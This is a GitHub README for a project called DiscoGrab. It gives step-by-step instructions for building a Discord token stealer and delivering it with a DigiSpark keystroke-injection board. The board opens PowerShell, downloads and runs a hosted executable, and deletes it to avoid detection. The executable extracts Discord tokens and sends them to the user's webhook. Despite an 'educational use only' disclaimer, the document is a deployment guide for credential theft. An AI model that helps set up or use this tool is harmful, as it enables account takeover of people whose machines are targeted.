## Overview

DiscoGrab is a demonstration tool that shows how Discord tokens can be captured using a DigiSpark board. It consists of two key components:

1. **Python Script** – Extracts Discord tokens and sends them to a webhook  
2. **DigiSpark Script** – Delivers the Python executable onto the target machine via simulated keystrokes

This project is hosted on [corehub-lol/DiscoGrab](https://github.com/corehub-lol/DiscoGrab).

> ⚠️ **EDUCATIONAL USE ONLY**

- This project is intended **only for ethical hacking and educational demonstration**
- Do **not** use this tool to access any system or account without explicit permission
- The author is not responsible for any misuse

---

## Requirements

- [Python 3.6+](https://www.python.org/downloads/)
- [PyInstaller](https://pyinstaller.org/)
- [Arduino IDE](https://www.arduino.cc/en/software)
- [DigiSpark ATtiny85 board](https://www.digistump.com/products/1)
- [DigiSpark Arduino Library](https://github.com/digistump/DigistumpArduino)
- A GitHub account to host your executable

---

## Setup Instructions

### Python Script Setup

```bash
git clone https://github.com/corehub-lol/DiscoGrab.git
cd DiscoGrab
```

1. Open `main.py` in any editor  
2. Replace the webhook placeholder with your actual Discord webhook:

```python
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
```

3. Save the file

---

### Creating the Executable

1. Install PyInstaller:

```bash
pip install pyinstaller
```

2. Create the executable:

```bash
python -m PyInstaller --onefile main.py
```

3. The `.exe` will be created in the `dist` folder  
4. Upload the file to your GitHub repo (create a release)  
5. Copy the **direct download link** for use in the DigiSpark script

---

### DigiSpark Script Setup

1. Install the Arduino IDE and add the DigiSpark boards:
   - Go to `File > Preferences`
   - Paste this into **Additional Board Manager URLs**:  
     ```
     http://digistump.com/package_digistump_index.json
     ```
   - Then go to `Tools > Board > Boards Manager`
   - Search for **Digistump AVR Boards** and install them

2. Open `main.ino` in the Arduino IDE  
3. Replace the placeholder link on line 18 with your GitHub direct download URL  
4. Save the file

---

## Usage

1. Plug your DigiSpark into your own PC (for testing)  
2. Open `main.ino` in the Arduino IDE  
3. Choose:
   ```
   Tools > Board > Digispark (Default - 16.5MHz)
   ```
4. Click **Upload**  
5. When prompted, insert the DigiSpark

What happens:
- PowerShell opens automatically on the target machine  
- Your hosted `.exe` is downloaded  
- It's executed to grab Discord tokens and send them to your webhook  
- The executable is deleted to avoid detection

---

## How It Works

### DigiSpark script (`main.ino`):
- Simulates keyboard input
- Opens PowerShell
- Executes a one-liner to download and run the payload
- Deletes the payload after execution

### Python script (`main.py`):
- Looks for Discord token storage paths
- Extracts tokens if found
- Sends them via your Discord webhook
- Optionally collects basic system info
